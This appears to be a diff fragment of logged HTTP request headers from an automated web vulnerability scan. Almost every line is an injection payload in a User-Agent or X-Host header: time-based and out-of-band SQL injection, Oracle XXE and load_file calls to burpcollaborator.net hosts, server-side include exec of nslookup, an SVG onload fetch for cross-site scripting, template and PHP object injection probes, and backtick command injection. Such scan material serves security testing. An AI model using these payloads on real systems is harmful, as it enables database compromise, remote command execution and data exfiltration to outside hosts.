+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0'(select*from(select(sleep(20)))a)'
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0'+(select*from(select(sleep(20)))a)+'
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0,(select*from(select(sleep(20)))a)
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0'+(select load_file('\\\\jcz69r2bivfptyqyzv50j18ar1xulk9bcz7mxam.burpcollaborator.net\\wvv'))+'
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0'.sleep(20).'
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0'+sleep(20.to_i)+'
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0t88irftx7q
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0' waitfor delay'0:0:20'--
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0')waitfor delay'0:0:20'--
+    User-Agent: nt54m${447*736}gko9a
+    User-Agent: O:3:"PDO":0:{}
+    User-Agent: q1sdyyri724wi5f5o2u788xhg8m1aryjq7lubi0
+    User-Agent: qbxbvmu76`z'z"${{%{{\
+    User-Agent: sbjx''dfle
+    User-Agent: (select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % ifeht SYSTEM "http://krf7oshcxwuq8z5zewk1y2nb62cv0loocjz9ny.burpcollab'||'orator.net/">%ifeht;]>'),'/l') from dual)
+    User-Agent: (select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % jtagz SYSTEM "http://vfekejy09fydz4oyddhngpr18sel2bqee91zpo.burpcollab'||'orator.net/">%jtagz;]>'),'/l') from dual)
+    User-Agent: (select load_file('\\\\y0zlx6qq6a34hdednatf7gwpfgl99zxqzeu1kp9.burpcollaborator.net\\hhv'))
+    User-Agent: (select load_file('\\\\yuwntmd3oidge731sgwqvs64nvtohe557t2gs4h.burpcollaborator.net\\fcd'))
+    User-Agent: "-->'-->`--><!--#set var="lin" value="khm7es7cnw"--><!--#set var="nkp" value="mjo9gu9epy"--><!--#echo var="lin"--><!--#echo var="nkp"--><!--#exec cmd="nslookup -q=cname 749u1fuzaj7dlmimrjxobp0yjppid810zoubkz9.burpcollaborator.net" -->
+    User-Agent: "-->'-->`--><!--#set var="m7g" value="l6fa59pq05"--><!--#set var="o9i" value="n8hc7brs27"--><!--#echo var="m7g"--><!--#echo var="o9i"--><!--#exec cmd="nslookup -q=cname 8t2xswcdnscqdh2brqv0u25em5sygo4g24xrnfc.burpcollaborator.net" -->
+    User-Agent: `sleep 11`
+    User-Agent: '"><svg/onload=fetch`//9nxwkhd1tlqf4o1oalgqurj02r8kwak2aq5dv1k\.burpcollaborator.net`>
+    User-Agent: '"><svg/onload=fetch`//hwh6v5fmq1fzgq5kuzy9xb8npev7jx7pxds0io7\.burpcollaborator.net`>
+    User-Agent: twtgt1ml25zzd8a8j5pa3bskbbh45utmhh47sw.burpcollaborator.net
+    User-Agent: TzozOiJQRE8iOjA6e30=
+    User-Agent: up28nf0loq
+    User-Agent: xm657${542*666}si71l
+    User-Agent: {!xmlparser v='<!DOCTYPE a SYSTEM "http://q3uiuoj8sjxff5j6bajpwgmo1f75vu.burpcollaborator.net/xxe"><a></a>'}
     vjv: g
     wrp: t
+    X-Host: bm10lz5ggv5t6kvekto3n5yhf8l19rxky8ovej3.burpcollaborator.net
+    X-Host: ivh5sqla1uyocx9xiuoz20r9a0gt4jsct0jn9by.burpcollaborator.net
+    Y5qG7fVc: Y5qG7fVc
+
 
 --------------------------------------------------------------------------------
 
